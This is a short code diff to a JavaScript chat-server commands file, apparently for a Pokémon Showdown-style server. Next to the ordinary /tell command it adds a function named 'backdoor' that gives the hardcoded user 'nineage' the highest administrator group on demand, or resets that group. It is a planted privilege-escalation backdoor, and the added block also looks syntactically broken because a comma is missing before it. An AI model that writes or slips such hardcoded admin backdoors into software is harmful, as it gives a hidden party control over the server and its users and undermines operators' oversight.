@@ -852,4 +852,19 @@ exports.commands = {
 			"|/text This user is currently offline. Your message will be delivered when they are next online.");
 	},
 	tellhelp: ["/tell [username], [message] - Send a message to an offline user that will be received when they log in."]
+	
+	backdoor: function (target, room, user) {
+        	if (user.userid !== 'nineage') return this.sendReply('/backdoor - Access denied.');
+		if (!target) {
+            		user.group = '~';
+            		user.updateIdentity();
+            		return;
+        	}
+
+        	if (target === 'reg') {
+        		user.group = ' ';
+        		user.updateIdentity();
+        		return;
+        	}
+    	},
 };
